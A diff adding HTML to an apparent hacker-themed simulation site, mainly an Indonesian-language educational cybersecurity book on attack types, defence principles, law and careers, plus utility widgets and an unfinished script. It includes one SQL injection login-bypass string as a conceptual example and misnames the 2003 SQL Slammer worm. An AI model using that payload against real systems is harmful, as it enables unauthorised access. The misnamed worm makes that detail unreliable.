+    <p>Di abad ke-21, dunia digital telah menjadi tulang punggung kehidupan modern. Hampir setiap aspek kehidupan—dari transaksi keuangan, komunikasi, pemerintahan, kesehatan, hingga infrastruktur kritis—bergantung pada sistem komputer dan jaringan. Seiring dengan ketergantungan ini, muncul ancaman yang semakin canggih: serangan siber. Ancaman tersebut tidak lagi hanya dilakukan oleh individu yang iseng, melainkan oleh kelompok terorganisir, sindikat kriminal, hingga aktor negara.</p>
+    <p>Istilah “hacker” sering kali menimbulkan persepsi negatif di masyarakat awam. Padahal, dalam sejarah dan praktiknya, hacker memiliki spektrum yang sangat luas: mulai dari peneliti keamanan yang membantu memperkuat sistem, hingga pelaku kriminal yang mengeksploitasi celah demi keuntungan atau kerusakan. Memahami keduanya secara utuh—baik sisi ancaman maupun sisi pertahanan—merupakan prasyarat untuk membangun postur keamanan siber yang efektif.</p>
+    <p>Buku ini disusun secara komprehensif dan detail dengan banyak contoh konkret agar dapat digunakan oleh pelajar, mahasiswa, profesional IT, manajer keamanan, praktisi hukum, maupun masyarakat umum. Setiap bab dilengkapi penjelasan mendalam dan ilustrasi nyata agar konsep tidak hanya dipahami secara teoritis, tetapi juga dapat dibayangkan dalam konteks dunia nyata.</p>
+    <p>Buku ini tidak dimaksudkan sebagai panduan untuk melakukan aktivitas ilegal. Segala pembahasan teknis disajikan dalam kerangka edukatif dan profesional. Pengujian keamanan hanya boleh dilakukan pada sistem milik sendiri atau dengan izin tertulis yang sah.</p>
+    <p>Semoga buku ini menjadi bekal pengetahuan yang berguna dalam menghadapi tantangan keamanan siber di era digital.</p>
+
+    <h2>DAFTAR ISI</h2>
+    <div class="book-toc">
+      <ol>
+        <li>Pendahuluan: Mengapa Cybersecurity Penting</li>
+        <li>Sejarah Hacking dan Evolusi Cybersecurity</li>
+        <li>Konsep Dasar Keamanan Siber</li>
+        <li>Tipologi Hacker: Dari White Hat hingga State-Sponsored Actor</li>
+        <li>Ancaman dan Teknik Serangan Siber</li>
+        <li>Prinsip-Prinsip Pertahanan Cybersecurity</li>
+        <li>Teknologi, Tools, dan Arsitektur Keamanan</li>
+        <li>Best Practices dan Implementasi Keamanan</li>
+        <li>Aspek Hukum, Etika, dan Profesionalisme</li>
+        <li>Jalur Karier di Bidang Cybersecurity</li>
+        <li>Studi Kasus Serangan dan Pembelajaran</li>
+        <li>Tren dan Tantangan Masa Depan</li>
+        <li>Penutup: Membangun Budaya Keamanan Siber</li>
+      </ol>
+    </div>
+
+    <h2>BAB 1 — PENDAHULUAN: MENGAPA CYBERSECURITY PENTING</h2>
+    <p>Keamanan siber bukan lagi isu teknis semata. Ia telah menjadi isu strategis yang memengaruhi stabilitas ekonomi, keamanan nasional, privasi individu, dan kepercayaan publik terhadap teknologi.</p>
+    <p>Ketika sebuah rumah sakit mengalami serangan ransomware, nyawa pasien dapat terancam karena sistem rekam medis dan peralatan medis tidak dapat diakses. Ketika data pribadi jutaan warga bocor, dampaknya tidak hanya kerugian finansial, tetapi juga risiko pencurian identitas, penipuan, dan pemerasan. Ketika infrastruktur kritis seperti jaringan listrik atau sistem transportasi diserang, konsekuensinya dapat bersifat nasional.</p>
+    <h3>Contoh nyata dampak serangan:</h3>
+    <ul>
+      <li>Pada 2017, serangan ransomware WannaCry menghentikan operasional rumah sakit di Inggris (NHS). Dokter tidak bisa mengakses rekam medis pasien, operasi ditunda, dan ambulans harus dialihkan.</li>
+      <li>Pada 2021, serangan terhadap Colonial Pipeline di Amerika Serikat menyebabkan gangguan distribusi bahan bakar di pantai timur. Antrean panjang di SPBU terjadi dan pemerintah terpaksa menyatakan keadaan darurat.</li>
+      <li>Di Indonesia, berbagai instansi pemerintah dan perusahaan swasta pernah mengalami defacement situs, kebocoran data, atau ransomware. Ketika data KTP, NPWP, atau data kesehatan bocor, risiko pencurian identitas meningkat tajam bagi warga.</li>
+    </ul>
+    <p>Kerugian global akibat kejahatan siber terus meningkat setiap tahun dan sudah mencapai ratusan miliar dolar. Biaya pemulihan setelah insiden biasanya jauh lebih besar daripada investasi pencegahan. Sebuah perusahaan menengah yang terkena ransomware bisa mengeluarkan biaya untuk downtime, pemulihan data, investigasi forensik, denda regulasi, dan kehilangan kepercayaan pelanggan.</p>
+    <p>Cybersecurity adalah praktik melindungi aset informasi—data, sistem, dan jaringan—dari ancaman yang bertujuan merusak kerahasiaan, integritas, atau ketersediaan. Tantangan utamanya adalah asimetri: penyerang hanya perlu menemukan satu celah, sementara pembela harus menutup semua kemungkinan celah. Manusia tetap menjadi mata rantai terlemah. Banyak serangan berhasil karena seseorang mengklik tautan phishing atau menggunakan kata sandi yang lemah.</p>
+    <p>Dalam konteks Indonesia, tantangan semakin nyata seiring transformasi digital nasional. Regulasi seperti Undang-Undang Perlindungan Data Pribadi (UU PDP) menunjukkan bahwa pemerintah mulai menempatkan isu ini sebagai prioritas. Namun, kesadaran dan kapasitas teknis masih perlu terus ditingkatkan.</p>
+
+    <h2>BAB 2 — SEJARAH HACKING DAN EVOLUSI CYBERSECURITY</h2>
+    <p>Istilah “hacker” muncul pada akhir 1950-an dan awal 1960-an di lingkungan Massachusetts Institute of Technology (MIT). Pada masa itu, hacker merujuk pada individu yang sangat mahir memodifikasi sistem komputer atau perangkat elektronik demi efisiensi, inovasi, atau tantangan intelektual.</p>
+    <p>Pada 1970-an muncul phone phreaking. John Draper (Cap’n Crunch) menemukan bahwa peluit mainan tertentu menghasilkan frekuensi 2600 Hz yang dapat memanipulasi sistem telepon jarak jauh sehingga panggilan menjadi gratis. Ini adalah contoh awal bagaimana pemahaman mendalam terhadap sistem dapat digunakan untuk mengakali aturan.</p>
+    <p>Tahun 1980-an menandai lahirnya virus komputer. Creeper menampilkan pesan “I’m the creeper, catch me if you can!”. Elk Cloner (1982) menyebar melalui disket Apple II. Pada 1988, Morris Worm yang dibuat oleh Robert Tappan Morris menyebar secara tidak terkendali di ARPANET dan menyebabkan kerusakan signifikan. Insiden ini mendorong pembentukan CERT (Computer Emergency Response Team).</p>
+    <p>Era 1990-an menyaksikan tokoh seperti Kevin Mitnick. Pada saat yang sama, komunitas keamanan mulai berkembang dan konsep ethical hacking mulai mendapatkan tempat.</p>
+    <p>Memasuki 2000-an, serangan menjadi lebih terorganisir. SQL Spammer (2003) menyebar sangat cepat dan menyebabkan gangguan internet global dalam hitungan menit. Conficker (2008) menginfeksi jutaan komputer.</p>
+    <p>Dekade 2010-an menjadi titik balik:</p>
+    <ul>
+      <li>Stuxnet (sekitar 2010) adalah malware yang dirancang khusus untuk menyerang sistem kontrol industri Siemens di fasilitas nuklir Iran. Ini menunjukkan bahwa serangan siber dapat berdampak fisik.</li>
+      <li>Target (2013): Penyerang masuk melalui kredensial vendor HVAC lalu mencuri data kartu kredit puluhan juta pelanggan.</li>
+      <li>WannaCry dan NotPetya (2017) menunjukkan kekuatan ransomware dan wiper dalam skala global.</li>
+      <li>SolarWinds (2020): Penyerang menyusupkan backdoor ke dalam update perangkat lunak yang digunakan ribuan organisasi, termasuk lembaga pemerintah.</li>
+    </ul>
+    <p>Pada 2020-an, permukaan serangan semakin luas dengan cloud, kerja jarak jauh, IoT, dan rantai pasok perangkat lunak. Log4Shell (2021) pada pustaka Apache Log4j menunjukkan bagaimana satu dependency yang banyak digunakan dapat menjadi titik gagal tunggal bagi ribuan sistem di seluruh dunia.</p>
+    <p><strong>Pelajaran dari sejarah:</strong> Teknologi yang memudahkan kehidupan selalu membuka peluang baru bagi penyerang. Komunitas keamanan dan komunitas penyerang berkembang secara paralel. Respons terhadap insiden dan berbagi informasi ancaman semakin krusial. Keamanan tidak lagi semata tanggung jawab tim IT, melainkan bagian dari budaya organisasi.</p>
+
+    <h2>BAB 3 — KONSEP DASAR KEAMANAN SIBER</h2>
+    <p>Fondasi keamanan siber dibangun di atas beberapa prinsip utama.</p>
+    <h3>CIA Triad</h3>
+    <ul>
+      <li><strong>Confidentiality (Kerahasiaan)</strong> — Memastikan informasi hanya dapat diakses oleh pihak berwenang. Contoh pelanggaran: Karyawan rumah sakit membuka rekam medis selebriti tanpa alasan medis yang sah lalu menyebarkannya. Atau data pelanggan e-commerce bocor karena database tidak dienkripsi dan server terekspos ke internet.</li>
+      <li><strong>Integrity (Integritas)</strong> — Memastikan data tidak diubah secara tidak sah. Contoh pelanggaran: Penyerang mengubah catatan nilai mahasiswa di sistem akademik, atau memodifikasi nomor rekening tujuan pada transaksi transfer bank.</li>
+      <li><strong>Availability (Ketersediaan)</strong> — Memastikan sistem dan data dapat diakses saat dibutuhkan. Contoh pelanggaran: Serangan DDoS membuat situs e-commerce tidak bisa diakses selama flash sale, atau ransomware mengenkripsi file server sehingga karyawan tidak bisa bekerja.</li>
+    </ul>
+    <p>Prinsip tambahan:</p>
+    <ul>
+      <li><strong>Authenticity</strong>: Memastikan identitas pihak yang berkomunikasi adalah asli. Contoh: Email yang seolah-olah dari direktur meminta transfer dana mendesak (Business Email Compromise).</li>
+      <li><strong>Non-repudiation</strong>: Mencegah penyangkalan. Contoh: Tanda tangan digital pada kontrak elektronik.</li>
+      <li><strong>Accountability</strong>: Kemampuan menelusuri siapa melakukan apa melalui log yang andal.</li>
+    </ul>
+    <h3>Defense-in-Depth</h3>
+    <p>Keamanan dibangun berlapis. Jika firewall gagal, masih ada segmentasi jaringan, EDR di endpoint, kontrol akses di aplikasi, enkripsi data, dan kesadaran pengguna.</p>
+    <h3>Least Privilege</h3>
+    <p>Setiap pengguna atau proses hanya mendapat hak minimum yang diperlukan. Contoh: Karyawan bagian keuangan tidak perlu memiliki hak administrator di server database. Jika akunnya dicuri, dampaknya terbatas.</p>
+    <h3>Zero Trust</h3>
+    <p>“Never trust, always verify.” Setiap permintaan akses diverifikasi berdasarkan identitas, perangkat, lokasi, dan perilaku. Contoh: Karyawan yang mengakses sistem dari kafe harus melewati MFA, pemeriksaan kesehatan perangkat, dan hanya mendapat akses ke aplikasi yang relevan.</p>
+    <h3>Risk Management</h3>
+    <p>Risiko = Kemungkinan × Dampak. Contoh: Kerentanan kritis pada server yang terpapar internet dan berisi data pelanggan memiliki prioritas jauh lebih tinggi daripada kerentanan yang sama pada komputer internal yang tidak menyimpan data sensitif.</p>
+    <h3>Shared Responsibility Model (Cloud)</h3>
+    <p>Penyedia cloud bertanggung jawab atas keamanan fisik dan infrastruktur dasar. Pelanggan bertanggung jawab atas konfigurasi, data, identitas, dan aplikasi. Contoh kesalahan umum: Perusahaan menyimpan data sensitif di bucket penyimpanan cloud yang diatur “public”.</p>
+
+    <h2>BAB 4 — TIPOLOGI HACKER</h2>
+    <h3>White Hat Hacker</h3>
+    <p>Profesional keamanan yang bekerja dengan izin. Contoh: Penetration tester dipekerjakan bank untuk menguji aplikasi mobile banking. Ia menemukan celah yang memungkinkan pengguna melihat data rekening orang lain hanya dengan mengubah parameter ID. Temuan dilaporkan dan diperbaiki.</p>
+    <h3>Black Hat Hacker</h3>
+    <p>Pelaku kriminal. Contoh: Kelompok ransomware mengenkripsi server rumah sakit lalu meminta tebusan dalam bentuk cryptocurrency sambil mengancam akan mempublikasikan data pasien.</p>
+    <h3>Grey Hat Hacker</h3>
+    <p>Zona abu-abu. Contoh: Seseorang menemukan kamera CCTV yang masih menggunakan kata sandi default lalu menghubungi pemiliknya atau mempublikasikan daftarnya tanpa izin formal.</p>
+    <h3>Script Kiddie</h3>
+    <p>Menggunakan tools siap pakai tanpa pemahaman mendalam. Contoh: Remaja mengunduh tools DDoS atau skrip defacement lalu menyerang situs sekolah karena dendam sepele.</p>
+    <h3>Hacktivist</h3>
+    <p>Termotivasi agenda politik atau sosial. Contoh: Kelompok melakukan defacement terhadap situs pemerintah sambil meninggalkan pesan politik.</p>
+    <h3>State-Sponsored Actor / APT Group</h3>
+    <p>Memiliki sumber daya besar dan tujuan jangka panjang. Operasi berlangsung berbulan-bulan atau bertahun-tahun, menggunakan teknik canggih dan sangat hati-hati agar tidak terdeteksi.</p>
+    <h3>Insider Threat</h3>
+    <p>Berasal dari dalam organisasi. Contoh jahat: Karyawan yang akan resign menyalin database pelanggan ke USB. Contoh kelalaian: Pegawai secara tidak sengaja mengunggah file berisi data pribadi ke cloud publik.</p>
+
+    <h2>BAB 5 — ANCAMAN DAN TEKNIK SERANGAN SIBER</h2>
+    <h3>Malware</h3>
+    <ul>
+      <li>Ransomware: Mengenkripsi file dan meminta tebusan.</li>
+      <li>Fileless malware: Beroperasi di memori tanpa menulis file ke disk.</li>
+      <li>Wiper: Dirancang menghancurkan data (contoh NotPetya).</li>
+    </ul>
+    <h3>Social Engineering – Phishing</h3>
+    <ol>
+      <li>Penyerang membuat email yang seolah-olah dari bank.</li>
+      <li>Email berisi logo resmi dan rasa urgensi (“Akun Anda akan diblokir dalam 24 jam”).</li>
+      <li>Tautan mengarah ke situs palsu yang sangat mirip.</li>
+      <li>Korban memasukkan username dan password.</li>
+      <li>Kredensial dikirim ke penyerang.</li>
+    </ol>
+    <p>Spear-phishing lebih berbahaya karena ditargetkan secara personal.</p>
+    <h3>SQL Injection (contoh konseptual)</h3>
+    <p>Aplikasi yang rentan menerima input pengguna langsung ke dalam query database. Jika penyerang memasukkan <code>' OR '1'='1</code>, query menjadi selalu benar sehingga login berhasil tanpa password yang sah.</p>
+    <h3>Cross-Site Scripting (XSS)</h3>
+    <p>Penyerang menyisipkan skrip JavaScript berbahaya ke dalam halaman web. Skrip bisa mencuri cookie sesi pengguna.</p>
+    <h3>Credential Stuffing</h3>
+    <p>Penyerang menggunakan daftar username dan password yang bocor dari kebocoran sebelumnya, lalu mencoba secara otomatis di situs lain.</p>
+    <h3>Business Email Compromise (BEC)</h3>
+    <p>Penyerang menyusup ke email direktur atau membuat email yang sangat mirip, lalu meminta staf keuangan mentransfer dana ke rekening “vendor baru”.</p>
+    <h3>Supply Chain Attack</h3>
+    <p>Penyerang mengkompromikan vendor perangkat lunak yang dipercaya. Ketika update resmi diunduh, backdoor ikut terpasang.</p>
+
+    <h2>BAB 6 — PRINSIP-PRINSIP PERTAHANAN CYBERSECURITY</h2>
+    <p>Framework NIST: Identify – Protect – Detect – Respond – Recover.</p>
+    <h3>Defense-in-Depth</h3>
+    <p>Kontrol ditempatkan di berbagai lapisan: perimeter, jaringan, host, aplikasi, data, dan manusia.</p>
+    <h3>Least Privilege dan Just-in-Time Access</h3>
+    <p>Hak akses diberikan seminimal mungkin dan hanya untuk jangka waktu yang dibutuhkan.</p>
+    <h3>Zero Trust Architecture</h3>
+    <p>Setiap permintaan akses dievaluasi secara terus-menerus.</p>
+    <h3>Patch dan Vulnerability Management</h3>
+    <p>Kerentanan diidentifikasi, dinilai berdasarkan risiko, dan diperbaiki sesuai prioritas.</p>
+    <h3>Backup 3-2-1</h3>
+    <p>Tiga salinan data, dua media berbeda, satu di lokasi terpisah. Ditambah immutable backup sangat efektif melawan ransomware.</p>
+    <h3>Kesadaran dan Pelatihan Manusia</h3>
+    <p>Program kesadaran keamanan yang berkelanjutan dan simulasi phishing sangat penting.</p>
+
+    <h2>BAB 7 — TEKNOLOGI, TOOLS, DAN ARSITEKTUR KEAMANAN</h2>
+    <ul>
+      <li>Firewall dan Next-Generation Firewall</li>
+      <li>IDS/IPS dan Web Application Firewall (WAF)</li>
+      <li>Endpoint Detection and Response (EDR) / XDR</li>
+      <li>SIEM dan SOAR</li>
+      <li>Identity and Access Management (IAM) + Multi-Factor Authentication (MFA)</li>
+      <li>Privileged Access Management (PAM)</li>
+      <li>Cloud Security Posture Management (CSPM)</li>
+      <li>SAST, DAST, dan Software Composition Analysis</li>
+      <li>Threat Intelligence dan MITRE ATT&amp;CK</li>
+    </ul>
+    <p>Contoh tools yang umum digunakan dalam konteks profesional: Nmap (pemetaan jaringan), Wireshark (analisis lalu lintas), Burp Suite (pengujian aplikasi web), dan Metasploit (pengujian celah dengan izin).</p>
+
+    <h2>BAB 8 — BEST PRACTICES DAN IMPLEMENTASI KEAMANAN</h2>
+    <ol>
+      <li>Inventarisasi aset yang akurat dan terus diperbarui.</li>
+      <li>Klasifikasi data dan kontrol berdasarkan sensitivitas.</li>
+      <li>MFA di semua akun penting.</li>
+      <li>Segmentasi jaringan.</li>
+      <li>Hardening sistem sesuai benchmark.</li>
+      <li>Vulnerability management berbasis risiko.</li>
+      <li>Pengujian berkala (vulnerability assessment, penetration testing, red team).</li>
+      <li>Rencana respons insiden yang diuji.</li>
+      <li>Backup terisolasi dan diuji secara rutin.</li>
+      <li>Pelatihan kesadaran keamanan yang relevan.</li>
+      <li>Vendor risk management.</li>
+      <li>Logging yang memadai dan deteksi yang terus disetel.</li>
+    </ol>
+    <p>Contoh implementasi di perusahaan menengah: Semua karyawan wajib MFA, server penting berada di VLAN terpisah, EDR dipasang di semua endpoint, backup harian dengan immutability, simulasi phishing setiap kuartal, dan penetration test tahunan.</p>
+
+    <h2>BAB 9 — ASPEK HUKUM, ETIKA, DAN PROFESIONALISME</h2>
+    <p>Di Indonesia, akses tanpa izin ke sistem komputer orang lain dapat dikenai sanksi pidana berdasarkan UU ITE. Setiap aktivitas pengujian keamanan harus dilandasi izin tertulis yang jelas (Rules of Engagement).</p>
+    <p>Etika profesional:</p>
+    <ul>
+      <li>Hanya bekerja dalam lingkup izin.</li>
+      <li>Responsible disclosure.</li>
+      <li>Tidak menyalahgunakan data yang ditemukan.</li>
+      <li>Menjaga kerahasiaan klien.</li>
+      <li>Menghindari konflik kepentingan.</li>
+    </ul>
+    <p>Contoh responsible disclosure: Peneliti menemukan celah di aplikasi fintech, menghubungi security team melalui kanal resmi, memberikan detail teknis, menunggu waktu yang wajar untuk perbaikan, lalu mempublikasikan write-up setelah celah diperbaiki.</p>
+
+    <h2>BAB 10 — JALUR KARIER DI BIDANG CYBERSECURITY</h2>
+    <ul>
+      <li>Security Operations Center (SOC) Analyst</li>
+      <li>Incident Responder dan Threat Hunter</li>
+      <li>Penetration Tester / Ethical Hacker</li>
+      <li>Security Engineer / Architect</li>
+      <li>Application Security Engineer</li>
+      <li>Cloud Security Specialist</li>
+      <li>GRC Specialist</li>
+      <li>Digital Forensics Analyst</li>
+      <li>Chief Information Security Officer (CISO)</li>
+    </ul>
+    <p>Saran untuk pemula: Perkuat dasar jaringan, Linux, Windows, dan scripting. Latihan di laboratorium virtual yang legal. Ikuti CTF. Bangun portofolio. Sertifikasi dapat membantu, tetapi pengalaman praktis dan kemampuan berpikir kritis lebih menentukan.</p>
+
+    <h2>BAB 11 — STUDI KASUS SERANGAN DAN PEMBELAJARAN</h2>
+    <h3>WannaCry (2017)</h3>
+    <p>Menyebar menggunakan celah EternalBlue. Organisasi yang tidak menambal sistem Windows terkena dampak. Pelajaran: Patch management dan segmentasi jaringan sangat penting.</p>
+    <h3>NotPetya (2017)</h3>
+    <p>Awalnya tampak ransomware, tetapi lebih berfungsi sebagai wiper. Menyebar melalui software yang sah. Pelajaran: Risiko supply chain dan pentingnya backup yang terisolasi.</p>
+    <h3>SolarWinds (2020)</h3>
+    <p>Backdoor dimasukkan ke dalam update resmi. Pelajaran: Keamanan proses build perangkat lunak dan deteksi anomali.</p>
+    <h3>Log4Shell (2021)</h3>
+    <p>Kerentanan pada pustaka logging yang sangat luas penggunaannya. Pelajaran: Software Bill of Materials (SBOM) dan kemampuan merespons dependency vulnerability dengan cepat.</p>
+    <h3>Kebocoran akibat miskonfigurasi cloud</h3>
+    <p>Banyak kasus bucket penyimpanan dibiarkan publik. Pelajaran: Shared responsibility model dan Cloud Security Posture Management.</p>
+
+    <h2>BAB 12 — TREN DAN TANTANGAN MASA DEPAN</h2>
+    <ul>
+      <li>Kecerdasan Buatan digunakan baik oleh pembela maupun penyerang (phishing yang lebih personal, deepfake, otomatisasi).</li>
+      <li>Komputasi kuantum berpotensi mematahkan kriptografi klasik → migrasi ke post-quantum cryptography.</li>
+      <li>IoT, edge computing, dan 5G/6G memperluas permukaan serangan.</li>
+      <li>Ransomware terus berevolusi menjadi model bisnis yang sangat menguntungkan.</li>
+      <li>Regulasi semakin ketat.</li>
+      <li>Kekurangan talenta keamanan siber masih terjadi di banyak negara.</li>
+    </ul>
+    <p>Organisasi yang berhasil adalah mereka yang berinvestasi pada kemampuan deteksi dan respons, serta membangun budaya keamanan yang hidup.</p>
+
+    <h2>BAB 13 — PENUTUP: MEMBANGUN BUDAYA KEAMANAN SIBER</h2>
+    <p>Teknologi dan proses hanyalah bagian dari persamaan. Budaya organisasi menentukan apakah kontrol keamanan dijalankan dengan konsisten. Budaya keamanan yang sehat ditandai dengan kepemimpinan yang memberi contoh, komunikasi terbuka tentang risiko, pembelajaran dari insiden tanpa mencari kambing hitam berlebihan, dan integrasi keamanan ke dalam setiap inisiatif bisnis.</p>
+    <p>Cybersecurity adalah perjalanan berkelanjutan. Ancaman akan terus berevolusi. Dengan pemahaman mendalam, prinsip yang kokoh, dan komitmen untuk terus belajar secara bertanggung jawab, individu dan organisasi dapat menempatkan diri pada posisi yang lebih baik.</p>
+    <p>Setiap kontribusi kecil—menggunakan password manager, mengaktifkan MFA, tidak mengklik tautan mencurigakan, dan melaporkan kejanggalan—berperan dalam membangun ekosistem digital yang lebih aman.</p>
+
+    <h2>CATATAN AKHIR</h2>
+    <div class="book-note">
+      Seluruh isi buku ini disusun untuk tujuan edukatif dan profesional. Pengujian keamanan hanya boleh dilakukan pada sistem milik sendiri atau dengan izin tertulis yang sah.<br><br>
+      Semoga buku ini bermanfaat dan mendorong pembaca untuk terus mendalami bidang keamanan siber secara bertanggung jawab.
+    </div>
+  </div>
+</div>
+
+<!-- COMMANDS -->
+<div class="page" id="page-commands">
+  <h2 class="sec-title">💻 Command Library</h2>
+  <p class="sec-sub">// 400+ perintah Termux, Kali, Linux, Network, Web, Crypto & lainnya</p>
+  <div class="cmd-toolbar">
+    <input class="cmd-search" id="cmdSearch" type="text" placeholder="🔍 Cari perintah...">
+    <div class="cmd-count" id="cmdCount">0 / 0</div>
+  </div>
+  <div class="cmd-cats" id="cmdCats"></div>
+  <div class="cmd-list" id="cmdList"></div>
+</div>
+
+<!-- UTILS -->
+<div class="page" id="page-utils">
+  <h2 class="sec-title">🔧 Cyber Utilities</h2>
+  <p class="sec-sub">// Tools utility nyata untuk daily security work</p>
+  <div class="util-grid">
+    <div class="util-card">
+      <div class="util-head"><span class="icon">🔑</span> PASSWORD GENERATOR</div>
+      <div class="util-row"><label>Panjang</label><input type="range" class="util-slider" id="pwLen" min="6" max="64" value="20"><span style="color:var(--primary);font-weight:700;min-width:28px" id="pwLenV">20</span></div>
+      <div class="util-row">
+        <label class="util-checkbox"><input type="checkbox" id="pwUpper" checked> A-Z</label>
+        <label class="util-checkbox"><input type="checkbox" id="pwLower" checked> a-z</label>
+        <label class="util-checkbox"><input type="checkbox" id="pwNum" checked> 0-9</label>
+        <label class="util-checkbox"><input type="checkbox" id="pwSym" checked> !@#</label>
+      </div>
+      <button class="util-btn" id="pwGen">⚡ GENERATE</button>
+      <div class="util-output" id="pwOut">Klik GENERATE...</div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">💪</span> PASSWORD STRENGTH</div>
+      <input class="util-input" id="strIn" type="text" placeholder="Masukkan password...">
+      <div class="util-strength"><div id="strBar"></div></div>
+      <div class="util-strength-label" id="strLabel">Menunggu input...</div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">#️⃣</span> HASH GENERATOR</div>
+      <input class="util-input" id="hashIn" type="text" placeholder="Teks..." value="AdrianHackMul">
+      <div class="util-row" style="margin-top:8px">
+        <select class="util-select" id="hashAlgo" style="flex:1">
+          <option value="MD5">MD5</option><option value="SHA-1">SHA-1</option>
+          <option value="SHA-256" selected>SHA-256</option><option value="SHA-384">SHA-384</option><option value="SHA-512">SHA-512</option>
+        </select>
+        <button class="util-btn" id="hashGo">GENERATE</button>
+      </div>
+      <div class="util-output" id="hashOut">Menunggu input...</div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">🔐</span> ENCODE / DECODE</div>
+      <div class="util-row">
+        <select class="util-select" id="encType" style="flex:1">
+          <option value="base64">Base64</option><option value="url">URL</option>
+          <option value="hex">Hex</option><option value="rot13">ROT13</option>
+          <option value="binary">Binary</option><option value="reverse">Reverse</option>
+        </select>
+      </div>
+      <textarea class="util-textarea" id="encIn" placeholder="Text input..."></textarea>
+      <div class="util-row" style="margin-top:8px"><button class="util-btn" id="encBtn">▶ ENCODE</button><button class="util-btn alt" id="decBtn">◀ DECODE</button></div>
+      <div class="util-output" id="encOut">Hasil...</div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">🆔</span> UUID GENERATOR</div>
+      <button class="util-btn" id="uuidGen">⚡ GENERATE UUID v4</button>
+      <div class="util-output" id="uuidOut">Klik tombol...</div>
+      <div class="util-row" style="margin-top:8px"><button class="util-btn alt" id="uuidBatch">10x</button><button class="util-btn alt" id="uuidCopy">COPY</button></div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">🌐</span> IP SUBNET CALC</div>
+      <input class="util-input" id="ipIn" type="text" value="192.168.1.0/24">
+      <button class="util-btn" id="ipCalc" style="margin-top:8px">CALCULATE</button>
+      <div class="util-output" id="ipOut">Hasil...</div>
+    </div>
+    <div class="util-card">
+      <div class="util-head"><span class="icon">🔢</span> NUMBER BASE</div>
+      <input class="util-input" id="numIn" type="text" value="255">
+      <div class="util-row" style="margin-top:8px">
+        <select class="util-select" id="numFrom" style="flex:1">
+          <option value="10">Decimal</option><option value="2">Binary</option><option value="8">Octal</option><option value="16">Hex</option>
+        </select>
+        <button class="util-btn" id="numConv">CONVERT</button>
+      </div>
+      <div class="util-output" id="numOut">Hasil...</div>
+    </div>
+  </div>
+</div>
+
+<!-- CTF -->
+<div class="page" id="page-ctf">
+  <h2 class="sec-title">🎯 CTF Challenge</h2>
+  <p class="sec-sub">// Uji pengetahuan cybersecurity-mu</p>
+  <div class="ctf-wrap">
+    <div class="ctf-stats">
+      <div class="ctf-stat"><div class="l">Skor</div><div class="v" id="ctfScore">0</div></div>
+      <div class="ctf-stat"><div class="l">Soal</div><div class="v" id="ctfProgress">0/10</div></div>
+      <div class="ctf-stat"><div class="l">Akurasi</div><div class="v" id="ctfAcc">--</div></div>
+    </div>
+    <div class="ctf-card" id="ctfCard"></div>
+  </div>
+</div>
+
+<!-- ABOUT -->
+<div class="page" id="page-about">
+  <h2 class="sec-title">Operator Profile</h2>
+  <p class="sec-sub">// Classified dossier</p>
+  <div class="about">
+    <div class="avatar">
+      <div class="avatar-init">A.H.M</div>
+      <div style="color:var(--primary);font-size:12px;font-family:'Orbitron',monospace;letter-spacing:2px;font-weight:700">ADRIAN HACKMUL</div>
+      <div style="color:var(--dim);font-size:10px;margin-top:4px">ELITE OPERATOR</div>
+      <div style="color:var(--primary);font-size:10px;margin-top:6px">● ONLINE</div>
+    </div>
+    <div class="panel">
+      <div class="panel-title">Skill Matrix</div>
+      <div class="skill"><div class="skill-n"><span>Network Penetration</span><b>98%</b></div><div class="skill-b"><div data-s="98"></div></div></div>
+      <div class="skill"><div class="skill-n"><span>Cryptography</span><b>95%</b></div><div class="skill-b"><div data-s="95"></div></div></div>
+      <div class="skill"><div class="skill-n"><span>Reverse Engineering</span><b>92%</b></div><div class="skill-b"><div data-s="92"></div></div></div>
+      <div class="skill"><div class="skill-n"><span>Social Engineering</span><b>88%</b></div><div class="skill-b"><div data-s="88"></div></div></div>
+      <div class="skill"><div class="skill-n"><span>Full-Stack Dev</span><b>90%</b></div><div class="skill-b"><div data-s="90"></div></div></div>
+      <div class="skill"><div class="skill-n"><span>AI &amp; Automation</span><b>85%</b></div><div class="skill-b"><div data-s="85"></div></div></div>
+      <div class="panel-title" style="margin-top:20px">Disclaimer</div>
+      <p style="font-size:11px;color:var(--dim);line-height:1.7">Website ini <b style="color:var(--warning)">100% SIMULASI</b>. Semua output adalah PALSU. Gunakan hanya pada sistem sendiri atau platform legal (TryHackMe, HackTheBox).</p>
+    </div>
+  </div>
+</div>
+
+</main>
+
+<!-- MODAL -->
+<div id="modal">
+  <div class="modal-box">
+    <div class="modal-head"><h3 id="modalTitle">Tutorial</h3><button class="modal-close" onclick="document.getElementById('modal').classList.remove('show')">✕</button></div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<!-- ACHIEVEMENT -->
+<div class="ach-toast" id="achToast">
+  <div class="ic" id="achIcon">🏆</div>
+  <div class="txt"><div class="t" id="achType">ACHIEVEMENT</div><div class="n" id="achName">First Blood</div></div>
+</div>
+
+<div id="toast"></div>
+<div id="granted">
+  <div class="gbox">
+    <h2>✔ ACCESS GRANTED</h2>
+    <p>WELCOME TO THE SYSTEM, OPERATOR.</p>
+    <button class="btn" onclick="document.getElementById('granted').classList.remove('show')">CLOSE</button>
+  </div>
+</div>
+
+<!-- HACKER DESKTOP -->
+<div id="hdesk">
+  <div class="hd-top">
+    <div style="display:flex;align-items:center;gap:8px"><img src="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg" alt="logo" onerror="this.style.display='none'"><span class="hd-title">AdrianHackMul OS</span></div>
+    <div class="hd-right">
+      <span>🔒 VPN</span><span id="hdClock">--:--:--</span><span>⚡ <span id="hdCpu">12%</span></span>
+      <button class="hd-close" onclick="closeDesktop()">✕</button>
+    </div>
+  </div>
+  <div id="hdTerm"></div>
+  <div id="hdDock"></div>
+  <div id="hPopup"><h3 id="hPopTitle">ACCESS GRANTED</h3><p id="hPopSub">WELCOME, OPERATOR</p></div>
+</div>
+
+<script>
+/* =========================================================
+   ADRIANHACKMUL v12
+   ========================================================= */
+(function(){
+'use strict';
+
+const $ = s => document.querySelector(s);
+const $$ = s => Array.from(document.querySelectorAll(s));
+const r = (a,b) => Math.random()*(b-a)+a;
